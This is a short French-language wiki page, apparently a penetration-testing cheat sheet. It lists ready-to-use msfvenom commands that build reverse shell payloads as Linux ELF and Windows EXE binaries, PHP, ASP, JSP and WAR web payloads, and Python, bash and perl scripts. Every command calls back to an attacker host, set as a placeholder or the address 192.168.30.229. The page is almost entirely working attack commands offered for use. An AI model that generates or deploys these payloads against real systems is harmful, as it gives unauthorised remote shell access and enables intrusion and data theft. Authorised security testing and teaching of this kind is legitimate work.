---
title: Reverse Shells
permalink: /Reverse_Shells/
---

# Reverse Shells

msfvenom
--------

### Payloads Executables

Rever shell en binaire ELF (Linux)

``` bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

Reverse shell (Windows)

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

### Payloads Webs

Reverse shell en PHP

``` bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.30.229 LPORT=443 -f raw > shell.php
```

Reverse shell en ASP.Net

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.229 LPORT=443 -f asp > meterpreter.asp
```

Reverse shell JSP

``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

Reverse shell sous forme de WAR

``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

### Payloads Scripts

Script python

``` bash
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

Script bash

``` bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

Script perl

``` bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

Ressources
----------

-   [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


